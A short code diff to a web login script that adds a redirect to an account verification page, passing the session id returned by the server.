@@ -50,6 +50,8 @@ function send_data() {
 
                             }, 1)
                             $("#login-submit").prop('disabled', false)
+                            window.location = `https://account.tanfwa.or.tz/verify/${responseObject.session_id}`
+
 
                         } else if (code === 300) {
                             $('#message_container').replaceWith("<div id=\"message\" style=\" padding:15px;margin: 15px; width:100% ; background:#dd4b39 \" > " + responseObject.msg + " </div>")
